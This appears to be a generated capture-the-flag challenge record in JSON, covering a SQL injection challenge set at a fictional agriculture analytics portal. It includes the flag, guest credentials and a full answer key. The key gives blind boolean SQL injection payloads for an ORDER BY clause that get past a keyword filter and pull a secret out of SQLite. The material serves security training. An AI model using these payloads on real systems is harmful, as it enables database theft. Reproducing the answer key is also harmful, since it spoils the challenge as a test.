@@ -1,0 +1,50 @@
+{
+  "run_number": 18,
+  "arm": "vanilla",
+  "terminal_state": "COMPLETE",
+  "quality_score": 95.0,
+  "calibrated_difficulty": 1.2,
+  "target_difficulty": 1.5,
+  "category": "sqli",
+  "challenge_type": "web",
+  "title": "VerdantPath Harvest Archive",
+  "description": "Welcome to the VerdantPath Analytics internal portal. As a junior agronomist, your task is to explore the harvest data. We've heard rumors that the legacy system settings contain highly sensitive credentials that shouldn't be there. Can you find a way to access the internal system metadata?",
+  "flag": "LEVELUP{2L973lCa5GNI5tilDACs25hJj9pA7tAl}",
+  "solution": "1. Log in with the guest credentials found in the application (guest:guest123).\n2. Navigate to the 'Harvest Data' section and observe the table. Note the 'Export' functionality.\n3. Intercept the network request when changing the table sort order. It hits `/api/v1/archive/telemetry` with a JSON payload: `{\"sort\": \"crop_type\", \"order\": \"ASC\"}`.\n4. Test for SQL injection in the 'sort' parameter. The application uses this value directly in an ORDER BY clause.\n5. Observe that the application has a WAF filtering 'UNION', 'SLEEP', and 'OR'. However, 'SELECT', 'CASE', and 'SUBSTR' are allowed.\n6. Use a Boolean-based Blind SQL injection within the ORDER BY clause: `(CASE WHEN (SELECT 1)=1 THEN id ELSE crop_type END)`. If the sort order changes based on the condition, injection is confirmed.\n7. Enumerate tables using `sqlite_master`: `(CASE WHEN (SELECT SUBSTR(name,1,1) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite%' LIMIT 1 OFFSET 2)='s' THEN id ELSE crop_type END)`. Note: User must find the 'site_settings' table.\n8. Enumerate columns in 'site_settings': `(CASE WHEN (SELECT SUBSTR(name,1,1) FROM pragma_table_info('site_settings') LIMIT 1 OFFSET 2)='v' THEN id ELSE crop_type END)`. Find 'setting_value'.\n9. Extract the flag from `site_settings` where `setting_name='internal_api_secret'`: `(CASE WHEN (SUBSTR((SELECT setting_value FROM site_settings WHERE setting_name='internal_api_secret'),1,1)='L') THEN id ELSE crop_type END)`. Iterate through characters to reconstruct the flag.",
+  "docker_image_tag": "levelup-challenge-851ffd04",
+  "narrative_context": {
+    "company_name": "VerdantPath Analytics",
+    "industry": "agriculture",
+    "scenario": "VerdantPath Analytics is a leading provider of precision agriculture solutions, managing massive data sets for global farming conglomerates. As the company expanded its IoT sensor network, it integrated several legacy databases into its primary cloud infrastructure to provide field managers with real-time soil health insights and historical harvest comparisons. The organization maintains a formal security team, but a recent series of acquisitions has left them struggling to maintain a unified security posture across all their digital assets.\n\nYou have been brought in as a security auditor to evaluate the 'Soil & Seed Yield Optimizer' tool. This application is a cornerstone of their 'HarvestMaster' suite, utilized by agronomists to make critical decisions about crop rotation and fertilization. Management is concerned that the integration of older data repositories might have introduced inconsistencies in how the application handles complex user-defined search parameters.",
+    "app_name": "Soil & Seed Yield Optimizer",
+    "app_purpose": "Allows agronomists to query historical harvest data, soil nutrient levels, and local weather patterns to generate predictive yield models.",
+    "data_theme": "agricultural telemetry, soil composition records, regional crop yield projections, and fertilizer chemical profiles",
+    "flavor_details": {
+      "company_motto": "Growing Tomorrow's Yields Today",
+      "department": "Precision Agronomy Research",
+      "recent_event": "A routine compliance audit flagged concerns regarding data isolation between regional research offices within the legacy database bridge.",
+      "tech_hints": [
+        "Enterprise-grade relational database back-end",
+        "Dynamic filtering parameters",
+        "Legacy repository middleware",
+        "Rich web interface with parameterized search"
+      ]
+    }
+  },
+  "calibration_notes": "Source analysis: The challenge is a classic ORDER BY injection in SQLite. While it requires a valid session (found via provided guest credentials) and bypasses a weak WAF, the WAF fails to block 'SELECT', 'CASE', or 'SUBSTR', making Boolean-based blind injection straightforward. The inclusion of raw database error messages in the response further simplifies payload debugging for the attacker. (target was 1.5)",
+  "verification_level": "smoke_tested",
+  "static_analysis_passed": true,
+  "smoke_test_passed": true,
+  "pipeline_states": [
+    "INIT",
+    "NARRATIVE",
+    "GENERATE",
+    "STATIC_ANALYSIS",
+    "VALIDATE",
+    "CALIBRATE",
+    "SMOKE_TEST",
+    "QUALITY_SCORE",
+    "DEPLOY",
+    "COMPLETE"
+  ]
+}
